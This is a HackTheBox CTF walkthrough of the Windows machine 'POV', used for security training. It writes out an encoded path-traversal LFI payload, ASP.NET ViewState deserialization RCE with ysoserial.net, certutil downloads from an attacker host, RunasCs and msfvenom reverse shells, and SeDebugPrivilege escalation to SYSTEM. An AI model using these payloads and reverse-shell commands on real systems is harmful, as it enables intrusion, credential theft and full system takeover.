# HackTheBox —POV

> **Difficulty:** Medium  
> **OS:** Windows  
> **Author:** ctxzero  


---

## 1. Reconnaissance

### Port Scan


```bash
rustscan -a 10.129.230.183 -u 5000 -b 2000 -- -sCV
```

<img width="612" height="181" alt="Pasted image 20260515181817" src="https://github.com/user-attachments/assets/e6399eca-b6ed-4962-a295-bc78383762e0" />


Only **Port 80 (HTTP)** is open. The service banner reveals the domain name `pov.htb`, which we add to `/etc/hosts`.

```
10.129.230.183  pov.htb
```

---

## 2. Web Enumeration

### pov.htb

Browsing to the main site reveals a standard landing page. The contact form exposes an email address worth noting:

```
sfitz@pov.htb
```

<img width="579" height="340" alt="Pasted image 20260515181855" src="https://github.com/user-attachments/assets/64ac18f4-bc61-4954-8449-4d3a299c4102" />


The contact form is a potential blind stored XSS vector, but we proceed with broader enumeration first.

<img width="1187" height="433" alt="Pasted image 20260515181914" src="https://github.com/user-attachments/assets/7615bcb6-62ae-4589-828f-fc7075527dd9" />


---

## 3. Virtual Host & Directory Discovery

### VHost Fuzzing


```bash
ffuf -u http://10.129.230.183 \
     -H "Host: FUZZ.pov.htb" \
     -w /usr/share/wordlists/seclists/Fuzzing/subdomains-top-10million-110000.txt \
     -t 250 \
     -fs 12320
```

**Result:** One additional virtual host is discovered — `dev.pov.htb`. Add it to `/etc/hosts`:

```
10.129.230.183  pov.htb dev.pov.htb
```

<img width="842" height="399" alt="Pasted image 20260515181927" src="https://github.com/user-attachments/assets/048dcf36-e417-4f3d-a25b-2872c0aa5963" />

### Directory Bruteforce


```bash
feroxbuster -u http://pov.htb/ \
            -w /usr/share/wordlists/seclists/Discovery/Web-Content/wordlists.txt \
            -x .php,.html,.txt \
            -t 250 -r -d 2
```

Several directories are returned for later review.

<img width="775" height="178" alt="Pasted image 20260515181947" src="https://github.com/user-attachments/assets/3a69af1d-1530-401f-8fa8-dd3f9460b8a6" />


---

## 4. Exploiting LFI on dev.pov.htb

<img width="1224" height="762" alt="Pasted image 20260515182004" src="https://github.com/user-attachments/assets/4b6bfdb2-1116-4699-881f-cbec88961835" />

<img width="1183" height="336" alt="Pasted image 20260515182014" src="https://github.com/user-attachments/assets/9f9e699a-f2fc-48dc-80e2-c109d89cb263" />


### Initial Enumeration

`dev.pov.htb` hosts a developer portfolio. Two things immediately stand out:

1. **"Download CV" button** — triggers a POST request with a `file` parameter in the body.
2. **A user review** hints at poor secure coding practices in **ASP.NET**.
3. The contact page URL ends in `contact.aspx`, confirming an ASP.NET backend.

### Discovering the File Parameter

Intercepting the CV download request in Burp Suite reveals:

```
POST /portfolio/ HTTP/1.1
...
file=cv.pdf
```

This immediately suggests a **Local File Inclusion (LFI)** vulnerability.

<img width="429" height="437" alt="Pasted image 20260515182044" src="https://github.com/user-attachments/assets/396e16d1-3f84-4c73-b630-66244d40687e" />


### Bypassing the Filter

Direct path traversal payloads (e.g., `../../windows/win.ini`) are filtered. However, URL-encoding the traversal sequence bypasses the restriction:

```
file=%2e%2e%5cweb.config
```

This successfully reads `web.config` and exposes the **ASP.NET Machine Key**:

<img width="890" height="627" alt="Pasted image 20260515182147" src="https://github.com/user-attachments/assets/9947f615-513c-4407-92fa-22ef6b050098" />


```xml
<machineKey
  validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
  decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
  validation="SHA1"
  decryption="AES" />
```

---

## 5. ViewState Deserialization → RCE

### Attack Overview

With the machine keys extracted, we can forge a malicious **ViewState** payload. When the server deserializes it, it executes arbitrary code.

**Attack chain:**

1. LFI → read `web.config`
2. Extract `validationKey` + `decryptionKey`
3. Generate malicious payload with `ysoserial.net`
4. Send forged `__VIEWSTATE` → RCE

### Payload Generation

Generate a PowerShell reverse shell (base64-encoded) at [revshells.com](https://www.revshells.com), then build the ViewState payload using `ysoserial.exe`:


```cmd
.\ysoserial.exe -p ViewState `
  -g TextFormattingRunProperties `
  --decryptionalg="AES" `
  --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
  --validationalg="SHA1" `
  --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" `
  --path="/portfolio/default.aspx" `
  -c "<BASE64_POWERSHELL_REVSHELL>"
```

<img width="1451" height="511" alt="Pasted image 20260515182219" src="https://github.com/user-attachments/assets/c7f73853-e3fa-44e0-967a-1cc013e417ef" />


### Exploitation

1. Start a listener:


```bash
   nc -lvnp 7777
```

2. In Burp Suite, replace the `__VIEWSTATE` parameter value with the generated payload and forward the request.



**Result:** Shell received as `sfitz`.

<img width="327" height="40" alt="Pasted image 20260515182319" src="https://github.com/user-attachments/assets/f93b405b-dba0-4f7b-b45b-b12dadad0200" />


---

## 6. Lateral Movement — sfitz → alaading

### Credential Discovery

Manual enumeration of `sfitz`'s home directory reveals a PowerShell credential file:

```
C:\Users\sfitz\Documents\connection.xml
```

<img width="1214" height="384" alt="Pasted image 20260515182339" src="https://github.com/user-attachments/assets/3f3f20af-9096-46d5-97c8-fc602dfc552e" />


Import and decrypt the stored credential:

```powershell
$cred = Import-Clixml .\connection.xml
$cred.GetNetworkCredential().Password
```

**Cleartext password recovered for user `alaading`.**

### Spawning a Shell as alaading

Standard `runas` doesn't work in this context. Instead, we use [RunasCs](https://github.com/antonioCoco/RunasCs) — an improved `runas` implementation.

**Build on Windows:**


```cmd
csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
```

**Transfer to target via Python HTTP server + certutil:**


```bash
# Attacker
python3 -m http.server 8000
```


```cmd
# Target
certutil.exe -urlcache -f http://10.10.14.46:8000/RunasCs.exe RunasCs.exe
```

**Execute:**


```bash
# Attacker — listener
nc -lvnp 4444
```


```cmd
# Target
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:4444
```

**Result:** Shell received as `alaading`.

---

## 7. Privilege Escalation — SeDebugPrivilege → SYSTEM

### Identifying the Privilege

```powershell
whoami /priv
```

`alaading` holds **SeDebugPrivilege** — this allows opening handles to processes owned by other users, including SYSTEM.

<img width="788" height="171" alt="Pasted image 20260515182413" src="https://github.com/user-attachments/assets/95977c41-dc54-437a-9a33-a31411a2629e" />

### Exploitation via Meterpreter Process Migration

**Step 1 — Generate a Meterpreter payload:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
         LHOST=<attacker_ip> LPORT=7777 \
         -f exe > shell1.exe
```

**Step 2 — Transfer and execute** (same method as before via certutil).

**Step 3 — Set up Metasploit handler:**

```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 7777
exploit
```

**Step 4 — Migrate to a SYSTEM process:**

In the Meterpreter session:

```
ps
```

<img width="834" height="276" alt="Pasted image 20260515182443" src="https://github.com/user-attachments/assets/5a4c7f28-4a8b-49e3-98b7-8bb304018d72" />


Locate `winlogon.exe` and note its PID, then:

```
migrate <PID>
shell
```

**Result:** `NT AUTHORITY\SYSTEM`

<img width="461" height="212" alt="Pasted image 20260515182504" src="https://github.com/user-attachments/assets/297cdfe5-fcba-43a4-9f22-6c14c7a825fd" />


---

## 8. Summary

|Step|Technique|Result|
|---|---|---|
|Recon|Port scan + VHost fuzzing|Found `dev.pov.htb`|
|LFI|URL-encoded path traversal|Read `web.config`|
|Initial Access|ViewState deserialization (ysoserial)|Shell as `sfitz`|
|Lateral Movement|PowerShell credential file + RunasCs|Shell as `alaading`|
|Privilege Escalation|SeDebugPrivilege + process migration|`NT AUTHORITY\SYSTEM`|
